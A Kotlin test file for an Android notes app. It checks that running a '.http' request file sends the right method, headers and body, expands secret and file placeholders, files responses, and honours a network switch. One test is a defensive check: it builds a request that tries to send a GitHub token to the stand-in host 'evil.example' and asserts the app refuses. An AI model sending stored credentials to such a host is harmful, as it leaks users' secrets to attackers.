package com.example.notes

import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertTrue
import org.junit.Test
import org.robolectric.RuntimeEnvironment
import java.io.File

/**
 * **A `.http` file, run by a person.**
 *
 * The agent reaches a request document through the `http` tool, and the tests for that are in
 * `HttpToolTest` and `ExpandTest`. This file is about the other door: the Run button on a `.http` file
 * in the editor, which must send the same thing and file the answer in the same place — because "what
 * did this project send" has to be one folder rather than two.
 *
 * **A fake fetcher, so no socket anywhere in this file.** The request that leaves the phone is asserted
 * directly, which is the only way to prove that expansion happened *before* sending rather than being
 * something the server would have noticed.
 */
class RequestFileFeatureTest : FeatureTest() {

    /** What the fake was asked, and what it answers. */
    private var askedUrl: String? = null
    private var askedMethod: String? = null
    private var askedHeaders: Map<String, String> = emptyMap()
    private var askedBody: ByteArray? = null
    private var status = 200
    private var answer = """{"login":"someone"}""".toByteArray()

    private fun fetcher() = object : Fetcher {
        override fun bytes(url: String, limitBytes: Long): Result<ByteArray> = Result.success(answer)

        override fun request(
            url: String,
            method: String,
            headers: Map<String, String>,
            body: ByteArray?,
            limitBytes: Long,
        ): Result<Fetcher.Answer> {
            askedUrl = url
            askedMethod = method
            askedHeaders = headers
            askedBody = body
            return Result.success(Fetcher.Answer(status, emptyMap(), answer))
        }
    }

    /** A phone whose requests go to the fake, and a project with [text] in `call.http`. */
    private fun phone(text: String): Pair<Scenario, File> {
        val scene = Scenario(RuntimeEnvironment.getApplication(), signIn = true, fetcher = fetcher())
        scene.project("shopping")
        scene.open("shopping")
        val file = scene.file("call.http", text)
        scene.viewModel.openEditor(file)
        return scene to file
    }

    @Test
    fun `a request file is sent with the method, the headers and the body it holds`() {
        val (scene, _) = phone(
            "POST https://api.example.com/issues\n" +
                "Content-Type: application/json\n" +
                "\n" +
                "{\"title\":\"Milk\"}",
        )

        scene.viewModel.runRequest(scene.viewModel.textOf(scene.viewModel.editingFile!!))
        scene.await("the request to be sent") { askedMethod != null }

        assertEquals("POST", askedMethod)
        assertEquals("https://api.example.com/issues", askedUrl)
        assertEquals("application/json", askedHeaders["Content-Type"])
        assertEquals("""{"title":"Milk"}""", String(askedBody!!, Charsets.UTF_8))
    }

    @Test
    fun `the answer is filed in agent http, where the agent's own answers go`() {
        val (scene, _) = phone("GET https://api.example.com/user")

        scene.viewModel.runRequest(scene.viewModel.textOf(scene.viewModel.editingFile!!))
        scene.await("the answer to be filed") {
            File(scene.workspace!!.projectDir("shopping"), Fetched.HTTP_DIR).listFiles().orEmpty().isNotEmpty()
        }

        val filed = File(scene.workspace!!.projectDir("shopping"), Fetched.HTTP_DIR).listFiles().orEmpty()
        assertEquals("one answer", 1, filed.size)
        assertEquals("holding the body", """{"login":"someone"}""", filed[0].readText())
    }

    @Test
    fun `a secret in the file is expanded before anything is sent`() {
        // **The value must never appear in the file**, and it must reach the header: both halves are
        // asserted, because a test that only checked the header would pass on a request whose token
        // was written down by hand.
        val (scene, _) = phone(
            "GET https://api.example.com/user\nAuthorization: Bearer {{secret:github}}",
        )
        scene.credentials.setSecret("github", "ghp_the_real_token", "api.example.com")

        scene.viewModel.runRequest(scene.viewModel.textOf(scene.viewModel.editingFile!!))
        scene.await("the request to be sent") { askedMethod != null }

        assertEquals("Bearer ghp_the_real_token", askedHeaders["Authorization"])
        assertFalse(
            "and the token is in no file the run wrote: ${scene.viewModel.message}",
            scene.viewModel.message.orEmpty().contains("ghp_the_real_token"),
        )
    }

    @Test
    fun `a file that names a paragraph in the project sends the paragraph`() {
        val (scene, _) = phone(
            "POST https://api.example.com/issues\n\n{\"body\":\"{{file:notes/body.md}}\"}",
        )
        File(scene.workspace!!.projectDir("shopping"), "notes").mkdirs()
        File(scene.workspace!!.projectDir("shopping"), "notes/body.md").writeText("two litres, please")

        scene.viewModel.runRequest(scene.viewModel.textOf(scene.viewModel.editingFile!!))
        scene.await("the request to be sent") { askedMethod != null }

        assertEquals(
            """{"body":"two litres, please"}""",
            String(askedBody!!, Charsets.UTF_8),
        )
    }

    @Test
    fun `a secret for another host is refused, and nothing is sent`() {
        val (scene, _) = phone(
            "GET https://evil.example/x\nAuthorization: Bearer {{secret:github}}",
        )
        scene.credentials.setSecret("github", "ghp_the_real_token", "api.github.com")

        scene.viewModel.runRequest(scene.viewModel.textOf(scene.viewModel.editingFile!!))
        scene.await("the refusal") { scene.viewModel.message != null }

        assertEquals("nothing was sent", null, askedMethod)
        val said = scene.viewModel.message.orEmpty()
        assertTrue("it names the host it was asked for: $said", said.contains("evil.example"))
        assertTrue("and where the secret really is: $said", said.contains("api.github.com"))
    }

    @Test
    fun `the network switch turns a hand-run request off as well`() {
        // **A person sending by hand is not a licence to spend a switch they turned off**, and the
        // refusal names the switch rather than failing at the socket.
        val (scene, _) = phone("GET https://api.example.com/user")
        scene.settings.keepHttp(false)

        scene.viewModel.runRequest(scene.viewModel.textOf(scene.viewModel.editingFile!!))
        scene.await("the refusal") { scene.viewModel.message != null }

        assertEquals("nothing was sent", null, askedMethod)
        assertTrue(
            "and it says which switch: ${scene.viewModel.message}",
            scene.viewModel.message.orEmpty().contains("switched off"),
        )
    }

    @Test
    fun `a document with no address is refused before anything is sent`() {
        val (scene, _) = phone("# just a note")

        scene.viewModel.runRequest(scene.viewModel.textOf(scene.viewModel.editingFile!!))
        scene.await("the refusal") { scene.viewModel.message != null }

        assertEquals("nothing was sent", null, askedMethod)
        assertTrue(
            "and it shows the shape: ${scene.viewModel.message}",
            scene.viewModel.message.orEmpty().contains("address"),
        )
    }

    @Test
    fun `the answer is said, with its status, so a person knows what came back`() {
        status = 201
        answer = """{"number":7}""".toByteArray()
        val (scene, _) = phone("POST https://api.example.com/issues\n\n{}")

        scene.viewModel.runRequest(scene.viewModel.textOf(scene.viewModel.editingFile!!))
        scene.await("the answer") { scene.viewModel.message?.contains("201") == true }

        val said = scene.viewModel.message.orEmpty()
        assertTrue("the status is there: $said", said.contains("201"))
        assertTrue("and the body: $said", said.contains("\"number\":7"))
    }
}
